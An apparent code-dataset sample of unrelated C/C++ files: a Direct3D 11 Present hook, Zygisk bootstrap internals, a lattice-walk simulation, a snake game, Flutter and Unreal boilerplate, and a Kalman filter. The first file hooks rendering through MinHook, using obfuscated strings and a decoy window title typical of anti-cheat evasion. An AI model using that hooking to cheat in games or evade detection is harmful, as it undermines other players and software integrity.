    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <sys/mount.h>\n#include <dlfcn.h>\n#include <unwind.h>\n\n#include <lsplt.hpp>\n\n#include <base.hpp>\n#include <consts.hpp>\n\n#include \"zygisk.hpp\"\n#include \"module.hpp\"\n#include \"jni_hooks.hpp\"\n\nusing namespace std;\n\n// *********************\n// Zygisk Bootstrapping\n// *********************\n//\n// Zygisk's lifecycle is driven by several PLT function hooks in libandroid_runtime, libart, and\n// libnative_bridge. As Zygote is starting up, these carefully selected functions will call into\n// the respective lifecycle callbacks in Zygisk to drive the progress forward.\n//\n// The entire bootstrap process is shown in the graph below.\n// Arrows represent control flow, and the blocks are sorted chronologically from top to bottom.\n//\n// libnative_bridge       libandroid_runtime                zygisk                 libart\n//\n//                            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                            \u2502 start \u2502\n//                            \u2514\u2500\u2500\u2500\u252c\u2500\u252c\u2500\u2518\n//                                \u2502 \u2502                                         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                                \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502LoadNativeBridge\u2502\n//                                \u2502                                           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n// \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u2502                                                   \u2502\n// \u2502LoadNativeBridge\u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n// \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518             \u2502\n//         \u2502    \u2502                 \u2502                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//         \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502NativeBridgeItf\u2502\n//         \u2502                      \u2502                     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//         \u2502                      \u2502                            \u2502\n//         \u2502                      \u2502                            \u25bc\n//         \u2502                      \u2502                        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//         \u2502                      \u2502                        \u2502hook_plt\u2502\n//         \u25bc                      \u2502                        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                  \u2502\n//     \u2502dlclose\u2502                  \u2502\n//     \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518                  \u2502\n//         \u2502                      \u2502\n//         \u2502                      \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502post_native_bridge_load\u2502\n//                                \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//                                \u25bc\n//                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                  \u2502androidSetCreateThreadFunc\u2502\n//                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//                                \u2502    \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                                \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502hook_jni_env\u2502\n//                                \u25bc                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//                       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                       \u2502register_jni_procs\u2502\n//                       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n//                                \u2502    \u2502              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                                \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502replace_jni_methods\u2502\n//                                \u2502                   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                                \u2502                                             \u2502         \u2502\n//                                \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502   JVM   \u2502\n//                                                                              \u2502         \u2502\n//                                                                              \u2514\u2500\u2500\u252c\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n//                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                      \u2502 \u2502\n//                      \u2502nativeXXXSpecialize\u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n//                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                        \u2502\n//                                    \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n//                                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502ZygiskContext\u2502              \u2502\n//                                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u25bc\n//                                                                         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n//                                                                         \u2502pthread_attr_destroy\u2502\n//                                                                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//                                                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n//                                                     \u2502restore_plt_hook\u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//                                                     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n//\n// Some notes regarding the important functions/symbols during bootstrap:\n//\n// * NativeBridgeItf: this symbol is the entry point for android::LoadNativeBridge\n// * HookContext::hook_plt(): hook functions like |dlclose| and |androidSetCreateThreadFunc|\n// * dlclose: the final step before android::LoadNativeBridge returns\n// * androidSetCreateThreadFunc: called in AndroidRuntime::startReg befo",
    "#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <set>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\nusing namespace std;\n\n/*\nTakes input variables \n* n : maximum number of iterations before the algorithm stops\n* desired_length : the desired length of the SAW\n* x : fugacity term should be set between 0 and 1\n* d : dimension of walk\n* z : coordination number should be set to 2d\n* save : 1 to store the walk, 0 to avoid this step\n\n*/\n\n\n\ndouble eucl_dist(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]);\n}\ndouble eucl_dist3D(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]+final_pos[2]*final_pos[2]);\n}\ndouble Pplus(double x, double z)\n{\n    //Acceptance probability for positive move\n    return min(1.0,z*x/(1.0+x*z));\n}\nint delta_func(int xy, int xpyp)\n{\n    if (xy==xpyp)\n    {\n        return 1;\n    }\n    else\n    {\n        return 0;\n    }\n}\ndouble localField(int direction_minus_1,int direction_current)\n{\n    //Local Field will return number of curves at the point\n    return 1 - 2*double(delta_func(direction_current,direction_minus_1));\n}\ndouble Pneg(double x, double z)\n{\n    //Acceptance probability for negative move\n    return min(1.0,1.0/(1.0+x*z));\n}\n\nvoid SaveWalk(vector<vector<int>> coordinates)\n{\n    ofstream file;\n\n    //naming file to store results in\n    file.open(\"TwoStepBSSAW2DWeighted.csv\");\n    for (int i = 0; i < coordinates.size(); i++) \n    { \n        for ( \n            auto it = coordinates[i].begin(); \n            it != coordinates[i].end(); it++) \n            file << *it << \",\"; \n        file << endl; \n    } \n    file.close();\n}\n\nvector<double> TwoMoveBerrettiSokal(double x, double z, double d, int n, int desired_length,  int save)\n{\n    /*\n    x fugacity \n    z = 2*d\n    d dimension \n    n max number of iterations \n    desired_length required length of walk \n    save 1/0, save the walk to csv file/not\n    */\n\n\n    vector<int> row(d);\n    vector<int> temp_row(d);\n    \n    //make coordinates vector the length of n and cut off where necessary at the end\n    //maximum length of coordinates is n \n    double dS;\n    vector<vector<int>> coordinates;\n    coordinates.push_back(row);\n    set<vector<int>> checker;\n\n    //update the length and append set at the same time\n    //if values are the same, new coord is valid \n    int length {1};\n    double e2e{0};\n    checker.insert(row);\n\n    //initialise a vector to store all directions and store the current SAW checker set\n    //Make it of length n, this is the maximum length that could be needed\n    \n    vector<int> prev_directions;\n    int prev_dir;\n    \n    //Random number generator for getting the direction \n    default_random_engine generator(random_device{}());\n    uniform_int_distribution<int> direction(1,2*d);\n    uniform_real_distribution<double> percent(0,1);\n\n    \n\n    //second random number generator to determine which move to make\n    //uniform_int_distribution<int> atmosphere_choice(1,2);\n    vector <int> length_per_step;\n    int move {0};\n    int step {0};\n    double acc {0};\n    double r {0};\n    int random_number, removal;\n    double index {0};\n    bool zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n    int break_point{0};\n    while (length < desired_length)\n    {\n        break_point+=1;\n        if (break_point == n)\n        {\n            break;\n        }\n        //First move is positive move unbounded to any direction\n        //std::cout << \"\\n\";\n        //std::cout <<\"Before Move Row: \"<< row[0] << \" \" << row[1] << \"\\n\"; \n\n        zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n        if (zeros == true)\n        {\n            //std::cout << \"At Origin \\n\";\n            //check to see if the move should be accepted\n            \n            \n            step = direction(generator);\n            //std::cout << \"Step in: \"<< step <<\" Directions \\n\";\n            prev_directions.push_back(step);    \n            if (step%2 == 0)\n            {\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] - 1;\n                temp_row[index] = temp_row[index] - 1;\n            }\n            else if (step%2 !=0)\n            {   \n                step += 1;\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] + 1;\n                temp_row[index] = temp_row[index] + 1;\n            }\n            coordinates.push_back(row);\n            checker.insert(row);\n            length += 1;\n            length_per_step.push_back(length);\n        }\n\n        else \n        {\n            //If move is 1 > positive move to be made\n            //If move = 2 > negative move\n            acc = Pplus(x,z);\n            if (acc < 1)\n            {\n                r = percent(generator);\n                \n                if (r > acc)\n                {\n                    //std::cout <",
    "#include <raylib.h>\n#include <deque>\n#include <raymath.h>\n#include <iostream>\n\nusing namespace std;\n\nColor green = {173,204,96,255};\nColor darkGreen = {43,51,24,255};\n\nint cellSize = 30;\nint cellCount = 25;\nint offset = 60;\ndouble speed = 1;\ndouble lastUpdateTime = 0.0;\n\nbool elementInDeque(Vector2 element, deque<Vector2> deque){\n    for (unsigned int i = 0; i < deque.size(); i++)\n    {\n        if(Vector2Equals(element, deque[i])){\n            return true;\n        }\n    }\n    return false;\n}\n\n\nbool eventTriggred(double interval){\n    double currentTime = GetTime();\n    if(currentTime - lastUpdateTime > interval){\n        lastUpdateTime = currentTime;\n        return true;\n    }\n    return false;\n}\n\n\nclass Snake{\n    public :\n        deque<Vector2> body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        Vector2 direction =  {1,0};\n        bool addSegment = false;\n    void Draw(){\n        for (unsigned int i = 0; i < body.size(); i++)\n        {\n            float x = body[i].x;\n            float y = body[i].y;\n            Rectangle segmant = Rectangle{offset+ x * cellSize, offset+ y * cellSize,   (float)cellSize,(float)cellSize};\n            DrawRectangleRounded(segmant,0.5 , 6, darkGreen);\n        }\n    }\n    void Update(){\n        body.push_front(Vector2Add(body[0], direction));\n\n        if (addSegment){\n            //body.push_back(body.back());\n            addSegment = false;\n        }\n        else{\n            body.pop_back();\n        }\n\n    }\n\n    void Reset(){\n        body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        direction =  {1,0};\n    }\n};\nclass Food\n{\npublic:\n    Vector2 postion;\n    Texture2D texture;\n\n    Food(deque<Vector2> SnakeBody){\n        Image image = LoadImage(\"assets/food.png\");\n        texture = LoadTextureFromImage(image);\n        UnloadImage(image);\n        postion = GenerateRandomPos(SnakeBody);\n    }\n    ~Food(){\n        UnloadTexture(texture);\n    }\n    void Draw(){\n        // DrawRectangle(postion.x * cellSize, postion.y * cellSize, cellSize, cellSize, darkGreen);\n        DrawTexture(texture, offset+ postion.x * cellSize, offset+ postion.y * cellSize, WHITE);\n    }\n\n    Vector2 GenerateRandomCell(){\n        float x = GetRandomValue(0, cellCount - 1);\n        float y = GetRandomValue(0, cellCount - 1);\n        return Vector2 {x,y};\n    }\n\n    /**\n     * Generates a random position within the range specified by cellCount.\n     *\n     * @return Vector2 the randomly generated position\n     */\n    Vector2 GenerateRandomPos(deque<Vector2> SnakeBody){\n        Vector2 postion = GenerateRandomCell();\n        while(elementInDeque(postion, SnakeBody)){\n            postion = GenerateRandomCell();\n        }\n        return postion;\n    }\n};\n\nclass Game\n{\npublic:\n    Food food = Food(snake.body);\n    Snake snake = Snake();\n    bool running = true;\n    int score = 0;\n    void Draw(){\n        snake.Draw();\n        food.Draw();\n    }\n    void Update(){\n        if (running) {\n            snake.Update();\n            CheckCollisionWithFood();\n            CheckCollisionWithEdges();\n            // CheckCollisionWithSelf();\n        }\n    }\n    void CheckCollisionWithFood(){\n        if(Vector2Equals(snake.body[0], food.postion)){\n            food.postion = food.GenerateRandomPos(snake.body);\n            cout << \"Food Eaten!\"<< endl;\n            snake.addSegment = true;\n            score++;\n            cout << \"Score: \" << score << endl;\n        }\n    }\n    void CheckCollisionWithEdges(){\n        if(snake.body[0].x == -1 || snake.body[0].x == cellCount || snake.body[0].y == -1 || snake.body[0].y == cellCount){\n            GameOver();\n        }\n    }\n\n    void CheckCollisionWithSelf(){\n        deque<Vector2> headless = snake.body;\n        headless.pop_front();\n        if (elementInDeque(snake.body[0], headless)){\n            GameOver();\n        }\n    }\n    \n    void GameOver(){\n        cout << \"Game Over!\" << endl;\n        running = false;\n        snake.Reset();\n        food.postion = food.GenerateRandomPos(snake.body);\n        score = 0;\n    }\n};\n\nint main()\n{\n    InitWindow(2*offset + cellSize * cellCount, 2*offset +cellSize * cellCount, \"Snake game by wesamdev | v1\");\n    SetTargetFPS(60);\n    Game game = Game();\n    while (!WindowShouldClose())\n    {\n        BeginDrawing();\n        ClearBackground(green);\n        if (eventTriggred(speed)){\n            if(IsKeyDown(KEY_UP) && game.snake.direction.y != 1){\n                game.snake.direction = {0,-1};\n                game.running = true;\n            }\n            if(IsKeyDown(KEY_DOWN) && game.snake.direction.y != -1){\n                game.snake.direction = {0,1};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_LEFT) && game.snake.direction.x != 1){\n                game.snake.direction = {-1,0};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_RIGHT) && game.snake.direction.x != -1){\n                game.snake.direction = {1,0};\n                game.running = true;\n            ",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeManagerUI_init() {}\n\tMANAGERUI_API UFunction* Z_Construct_UDelegateFunction_ManagerUI_CustomButtonClickedSignature__DelegateSignature();\n\tstatic FPackageRegistrationInfo Z_Registration_Info_UPackage__Script_ManagerUI;\n\tFORCENOINLINE UPackage* Z_Construct_UPackage__Script_ManagerUI()\n\t{\n\t\tif (!Z_Registration_Info_UPackage__Script_ManagerUI.OuterSingleton)\n\t\t{\n\t\t\tstatic UObject* (*const SingletonFuncArray[])() = {\n\t\t\t\t(UObject* (*)())Z_Construct_UDelegateFunction_ManagerUI_CustomButtonClickedSignature__DelegateSignature,\n\t\t\t};\n\t\t\tstatic const UECodeGen_Private::FPackageParams PackageParams = {\n\t\t\t\t\"/Script/ManagerUI\",\n\t\t\t\tSingletonFuncArray,\n\t\t\t\tUE_ARRAY_COUNT(SingletonFuncArray),\n\t\t\t\tPKG_CompiledIn | 0x00000000,\n\t\t\t\t0x58B3290E,\n\t\t\t\t0xEF582D7D,\n\t\t\t\tMETADATA_PARAMS(0, nullptr)\n\t\t\t};\n\t\t\tUECodeGen_Private::ConstructUPackage(Z_Registration_Info_UPackage__Script_ManagerUI.OuterSingleton, PackageParams);\n\t\t}\n\t\treturn Z_Registration_Info_UPackage__Script_ManagerUI.OuterSingleton;\n\t}\n\tstatic FRegisterCompiledInInfo Z_CompiledInDeferPackage_UPackage__Script_ManagerUI(Z_Construct_UPackage__Script_ManagerUI, TEXT(\"/Script/ManagerUI\"), Z_Registration_Info_UPackage__Script_ManagerUI, CONSTRUCT_RELOAD_VERSION_INFO(FPackageReloadVersionInfo, 0x58B3290E, 0xEF582D7D));\nPRAGMA_ENABLE_DEPRECATION_WARNINGS\n",
    "/**************************************************************************************************\n *\n * Copyright (c) 2019-2023 Axera Semiconductor (Shanghai) Co., Ltd. All Rights Reserved.\n *\n * This source file is the property of Axera Semiconductor (Shanghai) Co., Ltd. and\n * may not be copied or distributed in any isomorphic form without the prior\n * written consent of Axera Semiconductor (Shanghai) Co., Ltd.\n *\n **************************************************************************************************/\n\n#include \"tracker/kalmanFilter.hpp\"\n#include <Eigen/Cholesky>\n\nusing namespace skel::tracker;\n\nconst double KalmanFilter::chi2inv95[10] = {0, 3.8415, 5.9915, 7.8147, 9.4877, 11.070, 12.592, 14.067, 15.507, 16.919};\n\nKalmanFilter::KalmanFilter() {\n    AX_U32 ndim = 4;\n    double dt = 1.;\n\n    _motion_mat = Eigen::MatrixXf::Identity(8, 8);\n    for (AX_U32 i = 0; i < ndim; i++) {\n        _motion_mat(i, ndim + i) = (float)dt;\n    }\n    _update_mat = Eigen::MatrixXf::Identity(4, 8);\n\n    this->_std_weight_position = 1.0f / 20.0f;\n    this->_std_weight_velocity = 1.0f / 160.0f;\n}\n\nKAL_DATA KalmanFilter::initiate(const DETECT_BOX& measurement) {  // xyah\n    DETECT_BOX mean_pos = measurement;\n    DETECT_BOX mean_vel;\n    for (AX_U32 i = 0; i < 4; i++) {\n        mean_vel(i) = 0;\n    }\n\n    KAL_MEAN mean;\n    for (AX_U32 i = 0; i < 8; i++) {\n        if (i < 4)\n            mean(i) = mean_pos(i);\n        else\n            mean(i) = mean_vel(i - 4);\n    }\n\n    KAL_MEAN std;\n    std(0) = 2 * _std_weight_position * 